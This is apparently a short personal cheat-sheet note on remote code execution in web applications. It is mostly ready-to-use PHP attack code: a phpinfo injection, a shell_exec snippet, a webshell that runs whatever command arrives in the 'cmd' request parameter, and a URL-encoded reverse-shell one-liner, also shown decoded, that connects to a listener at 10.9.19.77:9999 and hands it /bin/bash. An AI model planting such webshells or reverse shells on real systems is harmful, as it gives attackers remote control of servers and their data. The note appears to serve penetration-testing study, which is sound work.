#WebExploitation 
RCE is a broad term that's applied to vulnerabilites that allow an attacker to execute arbitrary commands on the host operating system via the vulnerable applicatoin. This can also de done by injection of code into the webapp
![[RCE.JPG]]
*PHP code injection*
```php
<?PHP phpinfo(); ?>
```
```php
<?php   
$output = shell_exec('command');   
echo "<pre>$output</pre>";   
?>
```
Simple php webshell that executes the command passed in the GET cmd parameter 
```php
<?php  
  
if(isset($_REQUEST['cmd'])){  
        echo "<pre>";  
        $cmd = ($_REQUEST['cmd']);  
        system($cmd);  
        echo "</pre>";  
        die;  
}  
  
?>
```
Php one liner to open a reverse shell
```php
$(php+-r+'$sock%3dfsockopen("10.9.19.77",9999)%3b$proc%3dproc_open("/bin/bash",+array(0%3d>$sock,+1%3d>$sock,+2%3d>$sock),$pipes)%3b')
```
Decoded version
```php
$(
    php -r '
        $sock=fsockopen("10.9.19.77",9999);
        $proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    '
)
```